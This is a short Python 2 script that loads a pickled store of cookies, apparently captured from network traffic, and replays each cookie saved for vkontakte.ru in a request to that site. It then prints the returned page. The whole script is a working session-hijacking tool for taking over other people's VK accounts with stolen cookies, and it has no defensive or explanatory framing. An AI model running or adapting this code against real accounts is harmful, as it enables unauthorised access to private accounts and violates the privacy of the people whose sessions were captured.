#!/opt/local/bin/python
# encoding: utf-8
import urllib2
from pickle import load
saved  = open('out', 'rb')
hosts  = load(saved)

for vk_cookie in hosts['vkontakte.ru']:
	opener = urllib2.build_opener()
	opener.addheaders.append(('Cookie',vk_cookie))
	body = urllib2.urlopen("http://vkontakte.ru/").read()
	print body.decode("cp1251")
	
	
